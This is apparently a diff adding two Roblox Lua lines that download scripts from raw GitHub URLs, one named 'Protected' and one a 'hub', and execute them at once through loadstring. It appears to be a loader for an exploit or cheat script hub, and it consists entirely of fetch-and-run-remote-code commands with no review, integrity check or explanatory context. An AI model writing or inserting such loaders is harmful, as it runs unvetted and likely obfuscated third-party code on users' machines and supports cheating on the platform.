@@ -1,0 +1,3 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DoliScriptz/tests/refs/heads/main/Protected_3370271179496520.txt",true))()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DoliScriptz/tests/refs/heads/main/hub.txt.lua",true))()
